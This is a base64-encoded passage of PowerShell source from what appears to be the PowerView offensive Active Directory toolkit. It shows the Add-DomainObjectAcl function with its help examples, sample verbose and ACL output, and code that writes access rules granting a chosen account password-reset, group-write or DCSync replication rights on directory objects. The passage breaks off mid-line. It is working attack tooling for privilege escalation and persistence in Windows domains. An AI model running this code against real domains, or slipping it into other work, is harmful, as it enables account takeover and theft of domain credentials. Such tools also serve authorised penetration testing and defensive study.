RVRFUiBUb21ic3RvbmUKClN3aXRjaC4gU3BlY2lmaWVzIHRoYXQgdGhlIHNlYXJjaGVyIHNob3VsZCBhbHNvIHJldHVybiBkZWxldGVkL3RvbWJzdG9uZWQgb2JqZWN0cy4KCi5QQVJBTUVURVIgQ3JlZGVudGlhbAoKQSBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF0gb2JqZWN0IG9mIGFsdGVybmF0ZSBjcmVkZW50aWFscwpmb3IgY29ubmVjdGlvbiB0byB0aGUgdGFyZ2V0IGRvbWFpbi4KCi5QQVJBTUVURVIgUmlnaHRzCgpSaWdodHMgdG8gYWRkIGZvciB0aGUgcHJpbmNpcGFsLCAnQWxsJywgJ1Jlc2V0UGFzc3dvcmQnLCAnV3JpdGVNZW1iZXJzJywgJ0RDU3luYycuCkRlZmF1bHRzIHRvICdBbGwnLgoKLlBBUkFNRVRFUiBSaWdodHNHVUlECgpNYW51YWwgR1VJRCByZXByZXNlbnRpbmcgdGhlIHJpZ2h0IHRvIGFkZCB0byB0aGUgdGFyZ2V0LgoKLkVYQU1QTEUKCiRIYXJtajB5U2lkID0gR2V0LURvbWFpblVzZXIgaGFybWoweSB8IFNlbGVjdC1PYmplY3QgLUV4cGFuZFByb3BlcnR5IG9iamVjdHNpZApHZXQtRG9tYWluT2JqZWN0QUNMIGRmbS5hIC1SZXNvbHZlR1VJRHMgfCBXaGVyZS1PYmplY3QgeyRfLnNlY3VyaXR5aWRlbnRpZmllciAtZXEgJEhhcm1qMHlTaWR9CgouLi4KCkFkZC1Eb21haW5PYmplY3RBY2wgLVRhcmdldElkZW50aXR5IGRmbS5hIC1QcmluY2lwYWxJZGVudGl0eSBoYXJtajB5IC1SaWdodHMgUmVzZXRQYXNzd29yZCAtVmVyYm9zZQpWRVJCT1NFOiBbR2V0LURvbWFpblNlYXJjaGVyXSBzZWFyY2ggc3RyaW5nOiBMREFQOi8vUFJJTUFSWS50ZXN0bGFiLmxvY2FsL0RDPXRlc3RsYWIsREM9bG9jYWwKVkVSQk9TRTogW0dldC1Eb21haW5PYmplY3RdIEdldC1Eb21haW5PYmplY3QgZmlsdGVyIHN0cmluZzogKCYofChzYW1BY2NvdW50TmFtZT1oYXJtajB5KSkpClZFUkJPU0U6IFtHZXQtRG9tYWluU2VhcmNoZXJdIHNlYXJjaCBzdHJpbmc6IExEQVA6Ly9QUklNQVJZLnRlc3RsYWIubG9jYWwvREM9dGVzdGxhYixEQz1sb2NhbApWRVJCT1NFOiBbR2V0LURvbWFpbk9iamVjdF0gR2V0LURvbWFpbk9iamVjdCBmaWx0ZXIgc3RyaW5nOigmKHwoc2FtQWNjb3VudE5hbWU9ZGZtLmEpKSkKVkVSQk9TRTogW0FkZC1Eb21haW5PYmplY3RBY2xdIEdyYW50aW5nIHByaW5jaXBhbCBDTj1oYXJtajB5LENOPVVzZXJzLERDPXRlc3RsYWIsREM9bG9jYWwgJ1Jlc2V0UGFzc3dvcmQnIG9uIENOPWRmbSAoYWRtaW4pLENOPVVzZXJzLERDPXRlc3RsYWIsREM9bG9jYWwKVkVSQk9TRTogW0FkZC1Eb21haW5PYmplY3RBY2xdIEdyYW50aW5nIHByaW5jaXBhbCBDTj1oYXJtajB5LENOPVVzZXJzLERDPXRlc3RsYWIsREM9bG9jYWwgcmlnaHRzIEdVSUQgJzAwMjk5NTcwLTI0NmQtMTFkMC1hNzY4LTAwYWEwMDZlMDUyOScgb24gQ049ZGZtIChhZG1pbiksQ049VXNlcnMsREM9dGVzdGxhYixEQz1sb2NhbAoKR2V0LURvbWFpbk9iamVjdEFDTCBkZm0uYSAtUmVzb2x2ZUdVSURzIHwgV2hlcmUtT2JqZWN0IHskXy5zZWN1cml0eWlkZW50aWZpZXIgLWVxICRIYXJtajB5U2lkIH0KCkFjZVF1YWxpZmllciAgICAgICAgICAgOiBBY2Nlc3NBbGxvd2VkCk9iamVjdEROICAgICAgICAgICAgICAgOiBDTj1kZm0gKGFkbWluKSxDTj1Vc2VycyxEQz10ZXN0bGFiLERDPWxvY2FsCkFjdGl2ZURpcmVjdG9yeVJpZ2h0cyAgOiBFeHRlbmRlZFJpZ2h0Ck9iamVjdEFjZVR5cGUgICAgICAgICAgOiBVc2VyLUZvcmNlLUNoYW5nZS1QYXNzd29yZApPYmplY3RTSUQgICAgICAgICAgICAgIDogUy0xLTUtMjEtODkwMTcxODU5LTM0MzM4MDkyNzktMzM2NjE5Njc1My0xMTE0CkluaGVyaXRhbmNlRmxhZ3MgICAgICAgOiBOb25lCkJpbmFyeUxlbmd0aCAgICAgICAgICAgOiA1NgpBY2VUeXBlICAgICAgICAgICAgICAgIDogQWNjZXNzQWxsb3dlZE9iamVjdApPYmplY3RBY2VGbGFncyAgICAgICAgIDogT2JqZWN0QWNlVHlwZVByZXNlbnQKSXNDYWxsYmFjayAgICAgICAgICAgICA6IEZhbHNlClByb3BhZ2F0aW9uRmxhZ3MgICAgICAgOiBOb25lClNlY3VyaXR5SWRlbnRpZmllciAgICAgOiBTLTEtNS0yMS04OTAxNzE4NTktMzQzMzgwOTI3OS0zMzY2MTk2NzUzLTExMDgKQWNjZXNzTWFzayAgICAgICAgICAgICA6IDI1NgpBdWRpdEZsYWdzICAgICAgICAgICAgIDogTm9uZQpJc0luaGVyaXRlZCAgICAgICAgICAgIDogRmFsc2UKQWNlRmxhZ3MgICAgICAgICAgICAgICA6IE5vbmUKSW5oZXJpdGVkT2JqZWN0QWNlVHlwZSA6IEFsbApPcGFxdWVMZW5ndGggICAgICAgICAgIDogMAoKLkVYQU1QTEUKCiRIYXJtajB5U2lkID0gR2V0LURvbWFpblVzZXIgaGFybWoweSB8IFNlbGVjdC1PYmplY3QgLUV4cGFuZFByb3BlcnR5IG9iamVjdHNpZApHZXQtRG9tYWluT2JqZWN0QUNMIHRlc3R1c2VyIC1SZXNvbHZlR1VJRHMgfCBXaGVyZS1PYmplY3QgeyRfLnNlY3VyaXR5aWRlbnRpZmllciAtZXEgJEhhcm1qMHlTaWR9Cgpbbm8gcmVzdWx0cyByZXR1cm5lZF0KCiRTZWNQYXNzd29yZCA9IENvbnZlcnRUby1TZWN1cmVTdHJpbmcgJ1Bhc3N3b3JkMTIzISctQXNQbGFpblRleHQgLUZvcmNlCiRDcmVkID0gTmV3LU9iamVjdCBTeXN0ZW0uTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbCgnVEVTVExBQlxkZm0uYScsICRTZWNQYXNzd29yZCkKQWRkLURvbWFpbk9iamVjdEFjbCAtVGFyZ2V0SWRlbnRpdHkgdGVzdHVzZXIgLVByaW5jaXBhbElkZW50aXR5IGhhcm1qMHkgLVJpZ2h0cyBSZXNldFBhc3N3b3JkIC1DcmVkZW50aWFsICRDcmVkIC1WZXJib3NlClZFUkJPU0U6IFtHZXQtRG9tYWluXSBVc2luZyBhbHRlcm5hdGUgY3JlZGVudGlhbHMgZm9yIEdldC1Eb21haW4KVkVSQk9TRTogW0dldC1Eb21haW5dIEV4dHJhY3RlZCBkb21haW4gJ1RFU1RMQUInIGZyb20gLUNyZWRlbnRpYWwKVkVSQk9TRTogW0dldC1Eb21haW5TZWFyY2hlcl0gc2VhcmNoIHN0cmluZzogTERBUDovL1BSSU1BUlkudGVzdGxhYi5sb2NhbC9EQz10ZXN0bGFiLERDPWxvY2FsClZFUkJPU0U6IFtHZXQtRG9tYWluU2VhcmNoZXJdIFVzaW5nIGFsdGVybmF0ZSBjcmVkZW50aWFscyBmb3IgTERBUCBjb25uZWN0aW9uClZFUkJPU0U6IFtHZXQtRG9tYWluT2JqZWN0XSBHZXQtRG9tYWluT2JqZWN0IGZpbHRlciBzdHJpbmc6ICgmKHwofChzYW1BY2NvdW50TmFtZT1oYXJtajB5KShuYW1lPWhhcm1qMHkpKSkpClZFUkJPU0U6IFtHZXQtRG9tYWluXSBVc2luZyBhbHRlcm5hdGUgY3JlZGVudGlhbHMgZm9yIEdldC1Eb21haW4KVkVSQk9TRTogW0dldC1Eb21haW5dIEV4dHJhY3RlZCBkb21haW4gJ1RFU1RMQUInIGZyb20gLUNyZWRlbnRpYWwKVkVSQk9TRTogW0dldC1Eb21haW5TZWFyY2hlcl0gc2VhcmNoIHN0cmluZzogTERBUDovL1BSSU1BUlkudGVzdGxhYi5sb2NhbC9EQz10ZXN0bGFiLERDPWxvY2FsClZFUkJPU0U6IFtHZXQtRG9tYWluU2VhcmNoZXJdIFVzaW5nIGFsdGVybmF0ZSBjcmVkZW50aWFscyBmb3IgTERBUCBjb25uZWN0aW9uClZFUkJPU0U6IFtHZXQtRG9tYWluT2JqZWN0XSBHZXQtRG9tYWluT2JqZWN0IGZpbHRlciBzdHJpbmc6ICgmKHwofChzYW1BY2NvdW50TmFtZT10ZXN0dXNlcikobmFtZT10ZXN0dXNlcikpKSkKVkVSQk9TRTogW0FkZC1Eb21haW5PYmplY3RBY2xdIEdyYW50aW5nIHByaW5jaXBhbCBDTj1oYXJtajB5LENOPVVzZXJzLERDPXRlc3RsYWIsREM9bG9jYWwgJ1Jlc2V0UGFzc3dvcmQnIG9uIENOPXRlc3R1c2VyIHRlc3R1c2VyLENOPVVzZXJzLERDPXRlc3RsYWIsREM9bG9jYWwKVkVSQk9TRTogW0FkZC1Eb21haW5PYmplY3RBY2xdIEdyYW50aW5nIHByaW5jaXBhbCBDTj1oYXJtajB5LENOPVVzZXJzLERDPXRlc3RsYWIsREM9bG9jYWwgcmlnaHRzIEdVSUQgJzAwMjk5NTcwLTI0NmQtMTFkMC1hNzY4LTAwYWEwMDZlMDUyOScgb24gQ049dGVzdHVzZXIsQ049VXNlcnMsREM9dGVzdGxhYixEQz1sb2NhbAoKR2V0LURvbWFpbk9iamVjdEFDTCB0ZXN0dXNlciAtUmVzb2x2ZUdVSURzIHwgV2hlcmUtT2JqZWN0IHskXy5zZWN1cml0eWlkZW50aWZpZXIgLWVxICRIYXJtajB5U2lkIH0KCkFjZVF1YWxpZmllciAgICAgICAgICAgOiBBY2Nlc3NBbGxvd2VkCk9iamVjdEROICAgICAgICAgICAgICAgOiBDTj1kZm0gKGFkbWluKSxDTj1Vc2VycyxEQz10ZXN0bGFiLERDPWxvY2FsCkFjdGl2ZURpcmVjdG9yeVJpZ2h0cyAgOiBFeHRlbmRlZFJpZ2h0Ck9iamVjdEFjZVR5cGUgICAgICAgICAgOiBVc2VyLUZvcmNlLUNoYW5nZS1QYXNzd29yZApPYmplY3RTSUQgICAgICAgICAgICAgIDogUy0xLTUtMjEtODkwMTcxODU5LTM0MzM4MDkyNzktMzM2NjE5Njc1My0xMTE0CkluaGVyaXRhbmNlRmxhZ3MgICAgICAgOiBOb25lCkJpbmFyeUxlbmd0aCAgICAgICAgICAgOiA1NgpBY2VUeXBlICAgICAgICAgICAgICAgIDogQWNjZXNzQWxsb3dlZE9iamVjdApPYmplY3RBY2VGbGFncyAgICAgICAgIDogT2JqZWN0QWNlVHlwZVByZXNlbnQKSXNDYWxsYmFjayAgICAgICAgICAgICA6IEZhbHNlClByb3BhZ2F0aW9uRmxhZ3MgICAgICAgOiBOb25lClNlY3VyaXR5SWRlbnRpZmllciAgICAgOiBTLTEtNS0yMS04OTAxNzE4NTktMzQzMzgwOTI3OS0zMzY2MTk2NzUzLTExMDgKQWNjZXNzTWFzayAgICAgICAgICAgICA6IDI1NgpBdWRpdEZsYWdzICAgICAgICAgICAgIDogTm9uZQpJc0luaGVyaXRlZCAgICAgICAgICAgIDogRmFsc2UKQWNlRmxhZ3MgICAgICAgICAgICAgICA6IE5vbmUKSW5oZXJpdGVkT2JqZWN0QWNlVHlwZSA6IEFsbApPcGFxdWVMZW5ndGggICAgICAgICAgIDogMAoKLkxJTksKCmh0dHBzOi8vYWRzZWN1cml0eS5vcmcvP3A9MTkwNgpodHRwczovL3NvY2lhbC50ZWNobmV0Lm1pY3Jvc29mdC5jb20vRm9ydW1zL3dpbmRvd3NzZXJ2ZXIvZW4tVVMvZGYzYmZkMzMtYzA3MC00YTljLWJlOTgtYzRkYTZlNTkxYTBhL2ZvcnVtLWZhcS11c2luZy1wb3dlcnNoZWxsLXRvLWFzc2lnbi1wZXJtaXNzaW9ucy1vbi1hY3RpdmUtZGlyZWN0b3J5LW9iamVjdHM/Zm9ydW09d2luc2VydmVycG93ZXJzaGVsbAojPgoKICAgIFtEaWFnbm9zdGljcy5Db2RlQW5hbHlzaXMuU3VwcHJlc3NNZXNzYWdlQXR0cmlidXRlKCdQU1Nob3VsZFByb2Nlc3MnLCAnJyldCiAgICBbQ21kbGV0QmluZGluZygpXQogICAgUGFyYW0gKAogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSAwLCBWYWx1ZUZyb21QaXBlbGluZSA9ICRUcnVlLCBWYWx1ZUZyb21QaXBlbGluZUJ5UHJvcGVydHlOYW1lID0gJFRydWUpXQogICAgICAgIFtBbGlhcygnRGlzdGluZ3Vpc2hlZE5hbWUnLCAnU2FtQWNjb3VudE5hbWUnLCAnTmFtZScpXQogICAgICAgIFtTdHJpbmdbXV0KICAgICAgICAkVGFyZ2V0SWRlbnRpdHksCgogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkVGFyZ2V0RG9tYWluLAoKICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtBbGlhcygnRmlsdGVyJyldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkVGFyZ2V0TERBUEZpbHRlciwKCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRUYXJnZXRTZWFyY2hCYXNlLAoKICAgICAgICBbUGFyYW1ldGVyKE1hbmRhdG9yeSA9ICRUcnVlKV0KICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtTdHJpbmdbXV0KICAgICAgICAkUHJpbmNpcGFsSWRlbnRpdHksCgogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkUHJpbmNpcGFsRG9tYWluLAoKICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtBbGlhcygnRG9tYWluQ29udHJvbGxlcicpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJFNlcnZlciwKCiAgICAgICAgW1ZhbGlkYXRlU2V0KCdCYXNlJywgJ09uZUxldmVsJywgJ1N1YnRyZWUnKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRTZWFyY2hTY29wZSA9ICdTdWJ0cmVlJywKCiAgICAgICAgW1ZhbGlkYXRlUmFuZ2UoMSwgMTAwMDApXQogICAgICAgIFtJbnRdCiAgICAgICAgJFJlc3VsdFBhZ2VTaXplID0gMjAwLAoKICAgICAgICBbVmFsaWRhdGVSYW5nZSgxLCAxMDAwMCldCiAgICAgICAgW0ludF0KICAgICAgICAkU2VydmVyVGltZUxpbWl0LAoKICAgICAgICBbU3dpdGNoXQogICAgICAgICRUb21ic3RvbmUsCgogICAgICAgIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXQogICAgICAgIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uQ3JlZGVudGlhbEF0dHJpYnV0ZSgpXQogICAgICAgICRDcmVkZW50aWFsID0gW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdOjpFbXB0eSwKCiAgICAgICAgW1ZhbGlkYXRlU2V0KCdBbGwnLCAnUmVzZXRQYXNzd29yZCcsICdXcml0ZU1lbWJlcnMnLCAnRENTeW5jJyldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkUmlnaHRzID0gJ0FsbCcsCgogICAgICAgIFtHdWlkXQogICAgICAgICRSaWdodHNHVUlECiAgICApCgogICAgQkVHSU4gewogICAgICAgICRUYXJnZXRTZWFyY2hlckFyZ3VtZW50cyA9IEB7CiAgICAgICAgICAgICdQcm9wZXJ0aWVzJyA9ICdkaXN0aW5ndWlzaGVkbmFtZScKICAgICAgICAgICAgJ1JhdycgPSAkVHJ1ZQogICAgICAgIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydUYXJnZXREb21haW4nXSkgeyAkVGFyZ2V0U2VhcmNoZXJBcmd1bWVudHNbJ0RvbWFpbiddID0gJFRhcmdldERvbWFpbiB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snVGFyZ2V0TERBUEZpbHRlciddKSB7ICRUYXJnZXRTZWFyY2hlckFyZ3VtZW50c1snTERBUEZpbHRlciddID0gJFRhcmdldExEQVBGaWx0ZXIgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1RhcmdldFNlYXJjaEJhc2UnXSkgeyAkVGFyZ2V0U2VhcmNoZXJBcmd1bWVudHNbJ1NlYXJjaEJhc2UnXSA9ICRUYXJnZXRTZWFyY2hCYXNlIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydTZXJ2ZXInXSkgeyAkVGFyZ2V0U2VhcmNoZXJBcmd1bWVudHNbJ1NlcnZlciddID0gJFNlcnZlciB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snU2VhcmNoU2NvcGUnXSkgeyAkVGFyZ2V0U2VhcmNoZXJBcmd1bWVudHNbJ1NlYXJjaFNjb3BlJ10gPSAkU2VhcmNoU2NvcGUgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1Jlc3VsdFBhZ2VTaXplJ10pIHsgJFRhcmdldFNlYXJjaGVyQXJndW1lbnRzWydSZXN1bHRQYWdlU2l6ZSddID0gJFJlc3VsdFBhZ2VTaXplIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydTZXJ2ZXJUaW1lTGltaXQnXSkgeyAkVGFyZ2V0U2VhcmNoZXJBcmd1bWVudHNbJ1NlcnZlclRpbWVMaW1pdCddID0gJFNlcnZlclRpbWVMaW1pdCB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snVG9tYnN0b25lJ10pIHsgJFRhcmdldFNlYXJjaGVyQXJndW1lbnRzWydUb21ic3RvbmUnXSA9ICRUb21ic3RvbmUgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0NyZWRlbnRpYWwnXSkgeyAkVGFyZ2V0U2VhcmNoZXJBcmd1bWVudHNbJ0NyZWRlbnRpYWwnXSA9ICRDcmVkZW50aWFsIH0KCiAgICAgICAgJFByaW5jaXBhbFNlYXJjaGVyQXJndW1lbnRzID0gQHsKICAgICAgICAgICAgJ0lkZW50aXR5JyA9ICRQcmluY2lwYWxJZGVudGl0eQogICAgICAgICAgICAnUHJvcGVydGllcycgPSAnZGlzdGluZ3Vpc2hlZG5hbWUsb2JqZWN0c2lkJwogICAgICAgIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydQcmluY2lwYWxEb21haW4nXSkgeyAkUHJpbmNpcGFsU2VhcmNoZXJBcmd1bWVudHNbJ0RvbWFpbiddID0gJFByaW5jaXBhbERvbWFpbiB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snU2VydmVyJ10pIHsgJFByaW5jaXBhbFNlYXJjaGVyQXJndW1lbnRzWydTZXJ2ZXInXSA9ICRTZXJ2ZXIgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1NlYXJjaFNjb3BlJ10pIHsgJFByaW5jaXBhbFNlYXJjaGVyQXJndW1lbnRzWydTZWFyY2hTY29wZSddID0gJFNlYXJjaFNjb3BlIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydSZXN1bHRQYWdlU2l6ZSddKSB7ICRQcmluY2lwYWxTZWFyY2hlckFyZ3VtZW50c1snUmVzdWx0UGFnZVNpemUnXSA9ICRSZXN1bHRQYWdlU2l6ZSB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snU2VydmVyVGltZUxpbWl0J10pIHsgJFByaW5jaXBhbFNlYXJjaGVyQXJndW1lbnRzWydTZXJ2ZXJUaW1lTGltaXQnXSA9ICRTZXJ2ZXJUaW1lTGltaXQgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1RvbWJzdG9uZSddKSB7ICRQcmluY2lwYWxTZWFyY2hlckFyZ3VtZW50c1snVG9tYnN0b25lJ10gPSAkVG9tYnN0b25lIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydDcmVkZW50aWFsJ10pIHsgJFByaW5jaXBhbFNlYXJjaGVyQXJndW1lbnRzWydDcmVkZW50aWFsJ10gPSAkQ3JlZGVudGlhbCB9CiAgICAgICAgJFByaW5jaXBhbHMgPSBHZXQtRG9tYWluT2JqZWN0IEBQcmluY2lwYWxTZWFyY2hlckFyZ3VtZW50cwogICAgICAgIGlmICgtbm90ICRQcmluY2lwYWxzKSB7CiAgICAgICAgICAgIHRocm93ICJVbmFibGUgdG8gcmVzb2x2ZSBwcmluY2lwYWw6ICRQcmluY2lwYWxJZGVudGl0eSIKICAgICAgICB9CiAgICB9CgogICAgUFJPQ0VTUyB7CiAgICAgICAgJFRhcmdldFNlYXJjaGVyQXJndW1lbnRzWydJZGVudGl0eSddID0gJFRhcmdldElkZW50aXR5CiAgICAgICAgJFRhcmdldHMgPSBHZXQtRG9tYWluT2JqZWN0IEBUYXJnZXRTZWFyY2hlckFyZ3VtZW50cwoKICAgICAgICBGb3JFYWNoICgkVGFyZ2V0T2JqZWN0IGluICRUYXJnZXRzKSB7CgogICAgICAgICAgICAkSW5oZXJpdGFuY2VUeXBlID0gW1N5c3RlbS5EaXJlY3RvcnlTZXJ2aWNlcy5BY3RpdmVEaXJlY3RvcnlTZWN1cml0eUluaGVyaXRhbmNlXSAnTm9uZScKICAgICAgICAgICAgJENvbnRyb2xUeXBlID0gW1N5c3RlbS5TZWN1cml0eS5BY2Nlc3NDb250cm9sLkFjY2Vzc0NvbnRyb2xUeXBlXSAnQWxsb3cnCiAgICAgICAgICAgICRBQ0VzID0gQCgpCgogICAgICAgICAgICBpZiAoJFJpZ2h0c0dVSUQpIHsKICAgICAgICAgICAgICAgICRHVUlEcyA9IEAoJFJpZ2h0c0dVSUQpCiAgICAgICAgICAgIH0KICAgICAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICAgICAkR1VJRHMgPSBTd2l0Y2ggKCRSaWdodHMpIHsKICAgICAgICAgICAgICAgICAgICAjIFJlc2V0UGFzc3dvcmQgZG9lc24ndCBuZWVkIHRvIGtub3cgdGhlIHVzZXIncyBjdXJyZW50IHBhc3N3b3JkCiAgICAgICAgICAgICAgICAgICAgJ1Jlc2V0UGFzc3dvcmQnIHsgJzAwMjk5NTcwLTI0NmQtMTFkMC1hNzY4LTAwYWEwMDZlMDUyOScgfQogICAgICAgICAgICAgICAgICAgICMgYWxsb3dzIGZvciB0aGUgbW9kaWZpY2F0aW9uIG9mIGdyb3VwIG1lbWJlcnNoaXAKICAgICAgICAgICAgICAgICAgICAnV3JpdGVNZW1iZXJzJyB7ICdiZjk2NzljMC0wZGU2LTExZDAtYTI4NS0wMGFhMDAzMDQ5ZTInIH0KICAgICAgICAgICAgICAgICAgICAjICdEUy1SZXBsaWNhdGlvbi1HZXQtQ2hhbmdlcycgPSAxMTMxZjZhYS05YzA3LTExZDEtZjc5Zi0wMGMwNGZjMmRjZDIKICAgICAgICAgICAgICAgICAgICAjICdEUy1SZXBsaWNhdGlvbi1HZXQtQ2hhbmdlcy1BbGwnID0gMTEzMWY2YWQtOWMwNy0xMWQxLWY3OWYtMDBjMDRmYzJkY2QyCiAgICAgICAgICAgICAgICAgICAgIyAnRFMtUmVwbGljYXRpb24tR2V0LUNoYW5nZXMtSW4tRmlsdGVyZWQtU2V0JyA9IDg5ZTk1Yjc2LTQ0NGQtNGM2Mi05OTFhLTBmYWNiZWRhNjQwYwogICAgICAgICAgICAgICAgICAgICMgICB3aGVuIGFwcGxpZWQgdG8gYSBkb21haW4ncyBBQ0wsIGFsbG93cyBmb3IgdGhlIHVzZSBvZiBEQ1N5bmMKICAgICAgICAgICAgICAgICAgICAnRENTeW5jJyB7ICcxMTMxZjZhYS05YzA3LTExZDEtZjc5Zi0wMGMwNGZjMmRjZDInLCAnMTEzMWY2YWQtOWMwNy0xMWQxLWY3OWYtMDBjMDRmYzJkY2QyJywgJzg5ZTk1Yjc2LTQ0NGQtNGM2Mi05OTFhLTBmYWNiZWRhNjQwYyd9CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KCiAgICAgICAgICAgIEZvckVhY2ggKCRQcmluY2lwYWxPYmplY3QgaW4gJFByaW5jaXBhbHMpIHsKICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIltBZGQtRG9tYWluT2JqZWN0QWNsXSBHcmFudGluZyBwcmluY2lwYWwgJCgkUHJpbmNpcGFsT2JqZWN0LmRpc3Rpbmd1aXNoZWRuYW1lKSAnJFJpZ2h0cycgb24gJCgkVGFyZ2V0T2JqZWN0LlByb3BlcnRpZXMuZGlzdGluZ3Vpc2hlZG5hbWUpIgoKICAgICAgICAgICAgICAgIHRyeSB7CiAgICAgICAgICAgICAgICAgICAgJElkZW50aXR5ID0gW1N5c3RlbS5TZWN1cml0eS5QcmluY2lwYWwuSWRlbnRpdHlSZWZlcmVuY2VdIChbU3lzdGVtLlNlY3VyaXR5LlByaW5jaXBhbC5TZWN1cml0eUlkZW50aWZpZXJdJFByaW5jaXBhbE9iamVjdC5vYmplY3RzaWQpCgogICAgICAgICAgICAgICAgICAgIGlmICgkR1VJRHMpIHsKICAgICAgICAgICAgICAgICAgICAgICAgRm9yRWFjaCAoJEdVSUQgaW4gJEdVSURzKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkTmV3R1VJRCA9IE5ldy1PYmplY3QgR3VpZCAkR1VJRAogICAgICAgICAgICAgICAgICAgICAgICAgICAgJEFEUmlnaHRzID0gW1N5c3RlbS5EaXJlY3RvcnlTZXJ2aWNlcy5BY3RpdmVEaXJlY3RvcnlSaWdodHNdICdFeHRlbmRlZFJpZ2h0JwogICAgICAgICAgICAgICAgICAgICAgICAgICAgJEFDRXMgKz0gTmV3LU9iamVjdCBTeXN0ZW0uRGlyZWN0b3J5U2VydmljZXMuQWN0aXZlRGlyZWN0b3J5QWNjZXNzUnVsZSAkSWRlbnRpdHksICRBRFJpZ2h0cywgJENvbnRyb2xUeXBlLCAkTmV3R1VJRCwgJEluaGVyaXRhbmNlVHlwZQogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIGVsc2UgewogICAgICAgICAgICAgICAgICAgICAgICAjIGRlYXVsdCB0byBHZW5lcmljQWxsIHJpZ2h0cwogICAgICAgICAgICAgICAgICAgICAgICAkQURSaWdodHMgPSBbU3lzdGVtLkRpcmVjdG9yeVNlcnZpY2VzLkFjdGl2ZURpcmVjdG9yeVJpZ2h0c10gJ0dlbmVyaWNBbGwnCiAgICAgICAgICAgICAgICAgICAgICAgICRBQ0VzICs9IE5ldy1PYmplY3QgU3lzdGVtLkRpcmVjdG9yeVNlcnZpY2VzLkFjdGl2ZURpcmVjdG9yeUFjY2Vzc1J1bGUgJElkZW50aXR5LCAkQURSaWdodHMsICRDb250cm9sVHlwZSwgJEluaGVyaXRhbmNlVHlwZQogICAgICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICAgICAgIyBhZGQgYWxsIHRoZSBuZXcgQUNFcyB0byB0aGUgc3BlY2lmaWVkIG9iamVjdCBkaXJlY3RvcnkgZW50cnkKICAgICAgICAgICAgICAgICAgICBGb3JFYWNoICgkQUNFIGluICRBQ0VzKSB7CiAgICAgICAgICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIltBZGQtRG9tYWluT2JqZWN0QWNsXSBHcmFudGluZyBwcmluY2lwYWwgJCgkUHJpbmNpcGFsT2JqZWN0LmRpc3Rpbmd1aXNoZWRuYW1lKSByaWdodHMgR1VJRCAnJCgkQUNFLk9iamVjdFR5cGUpJyBvbiAkKCRUYXJnZXRPYmplY3QuUHJvcGVydGllcy5kaXN0aW5ndWlzaGVkbmFtZSkiCiAgICAgICAgICAgICAgICAgICAgICAgICRUYXJnZXRFbnRyeSA9ICRUYXJnZXRPYmplY3QuR2V0RGlyZWN0b3J5RW50cnkoKQogICAgICAgICAgICAgICAgICAgICAgICAkVGFyZ2V0RW50cnkuUHNCYXNlLk9wdGlvbnMuU2VjdXJpdHlNYXNrcyA9ICdEYWNsJwogICAgICAgICAgICAgICAgICAgICAgICAkVGFyZ2V0RW50cnkuUHNCYXNlLk9iamVjdFNlY3VyaXR5LkFkZEFjY2Vzc1J1bGUoJEFDRSkKICAgICAgICAgICAgICAgICAgICAgICAgJFRhcmdldEVudHJ5LlBzQmFzZS5Db21taXRDaGFuZ2VzKCkKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBjYXRjaCB7CiAgICAgICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiW0FkZC1Eb21haW5PYmplY3RBY2xdIEVycm9yIGdyYW50aW5nIHByaW5jaXBhbCAkKCRQcmluY2lwYWxPYmplY3QuZGlzdGluZ3Vpc2hlZG5hbWUp